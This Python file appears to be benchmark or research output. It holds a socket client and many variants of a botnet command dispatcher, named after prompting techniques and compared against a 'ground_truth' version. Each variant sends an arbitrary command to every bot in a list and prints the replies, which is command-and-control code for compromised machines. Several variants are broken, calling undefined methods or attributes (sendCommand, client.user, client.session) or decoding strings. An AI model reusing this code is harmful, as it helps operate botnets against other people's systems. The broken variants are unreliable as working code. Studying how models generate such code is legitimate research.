from pexpect import pxssh
import paramiko
import socket

class Client:

    def __init__(self, host, port):
        self.addr = (host, port)
        self.host = host
        
    def send_command(self, command):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            s.connect(self.addr)
            s.sendall(command.encode())
            try:
                data = s.recv(4096)
                return data.decode()
            except socket.timeout:
                pass

# Lista botNet
botNet = [
    Client("bot", 9999),
]

def ground_truth_code_botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print(f"Output from {client.addr}:{output}")

def persona_botnetCommand(command):
	for client in botNet:
		try:
			output = client.send_command(command)
			print('[+] Output from'+ client.host +':\n' + output)
		except Exception as e:
			print(str(e))
                  
def template_botnetCommand(command):
    if not isinstance(command, str):
        raise TypeError("The command must be a string")
    try:
        results = ""
        for client in botNet:
            output = client.send_command(command)
            results += "--- Output from " + client.host + " ---\n" + output
        print (results)
    except Exception as e:
        print(e)
        print('[+] Error running command')
        
def question_refinement_botnetCommand(botNet, command):
    for client in botNet:
        try:
            output = client.sendCommand(command, ssh_key='path/to/ssh/key')
            print(f'Output from {client.host}: {output}')
        except Exception as e:
            print(f'Error executing command on {client.host}: {e}')
                  
def alternative_approaches_botnetCommand(command):
    for client in botNet:
        try:
            output = client.send_command(command)
            print(f"Output from {client.host}:\n{output}\n")
        except Exception as e:
            print(f"[-] Error sending command to {client.host}: {e}")
            
def context_manager_botnetCommand(command):
    for client in botNet:
        try:
            output = client.send_command(command)
            print('[*] {}:{}, {}'.format(client.host, client.user, output))
        except ValueError:
            print('[-] ValueError Caught!')

            
def flipped_interaction_3__botnetCommand(command):
	output = {}
	for client in botNet:
		try:
			output[client.host] = client.send_command(command)
		except Exception as e:
			output[client.host] = str(e)
	print (output[client.host])

def flipped_interaction_4__botnetCommand(command):
    results = {}
    success_count = 0
    failure_count = 0
    for client in botNet:
        try:
            output = client.send_command(command)
            results[client.host] = output
            success_count += 1
        except Exception as e:
            print(f"Error executing command on {client.host}: {str(e)}")
            failure_count += 1
    print(f"Command execution complete: {success_count} successes, {failure_count} failures")
    return results

def flipped_interaction_5__botnetCommand(command, cleanupOutput=True):
    results = {}
    for client in botNet[:]:
        try:
            output = client.send_command(command)
            if cleanupOutput:
                output = output.decode().strip()
            results[client.host] = {'output': output}
        except Exception as e:
            print(f'Error sending command to {client.host}: {str(e)}')
            results[client.host] = {'error': str(e)}
        try:
            client.session.prompt()
        except pxssh.ExceptionPxssh as e:
            print(f'Lost connection to {client.host}: {str(e)}')
            botNet.remove(client)
    return results


def iterative_prompting_3__botnetCommand(command):
    if not isinstance(command, str):
        raise TypeError('Command must be a string')
    if not botNet:
        raise ValueError('Botnet is empty')
    results = []
    for client in botNet:
        try:
            output = client.session.strip().encode('utf-8').decode('utf-8') if client.session else ''
            output = client.send_command(command)
            output = output.strip().encode('utf-8').decode('utf-8')
            results.append('[+] '+ client.host + '\n' + output)
        except Exception as e:
            results.append('[!] '+ client.host + ':'+ str(e))
    print (results)

def iterative_prompting_4__botnetCommand(command):
    if not isinstance(command, str) or len(command.strip()) == 0:
        raise ValueError('Invalid command')
    if not botNet:
        raise ValueError('No clients available')
    for client in botNet:
        try:
            print(f'[*] {client.host} -> {command}')
            output = client.send_command(command)
            if output:
                print(f'[*] Output > {output}')
            else:
                print(f'[*] No output received from {client.host}')
        except Exception as ex:
            print(f'[*] Error occurred on {client.host}: {str(ex)}')
            
def iterative_prompting_5__botnetCommand(command):
    if not isinstance(command, str) or len(command.strip()) == 0:
        raise ValueError('Invalid command')
    if not isinstance(botNet, list) or not botNet or not all(isinstance(client, Client) for client in botNet):
        raise ValueError('BotNet is empty or contains invalid clients')
    for client in botNet:
        try:
            output = client.send_command(command)
            if output is not None:
                decoded_output = output.decode('utf-8', errors='replace')
                print('Output from {}:\n\n{}'.format(client.host, decoded_output.rstrip()))
        except pxssh.ExceptionPxssh as e:
            print('pxssh error occurred on {}: {}'.format(client.host, str(e)))
        except Exception as e:
            print('Error occurred on {}: {}'.format(client.host, str(e)))
        finally:
            if hasattr(client,'session') and client.session is not None:
                client.session.logout()
                
def few_shots_prompting_botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print('[*] ' + client.host + ' - ' + output)

          
def cot_prompting_botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print('[*] Output from ' + client.host)
        print('[*] ' + output)

          
def fact_check_list_botnetCommand(command):
    if not isinstance(command, str):
        raise TypeError('Input command should be a string')
    results = {}
    for client in botNet:
        try:
            output = client.send_command(command)
            results[client.host] = output
        except Exception as e:
            print(f'[-] Error occurred while sending command to {client.host}: {e}')
    print (results)

def not_interactive_mix_botnetCommand(command):
    results = []
    try:
        for client in botNet:
            if isinstance(client, Client):
                output = client.send_command(command)
                results.append({'host': client.host, 'output': output})
            else:
                raise ValueError('Invalid client type')
    except Exception as e:
        print(f'An error occurred: {e}')
        raise
    print (results)

import logging
def interactive_mix_botnetCommand(command):
    logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
    for client in botNet:
        try:
            output = client.send_command(command)
            print(f'Command executed on {client.host}: {command} | Output: {output}')
        except Exception as e:
            print(f'Error executing command on {client.host}: {command} | Error: {str(e)}')
            
def baseline_botnetCommand(command):
	output = {}
	for i, client in enumerate(botNet):
		output[i] = client.send_command(command)
	print (output)
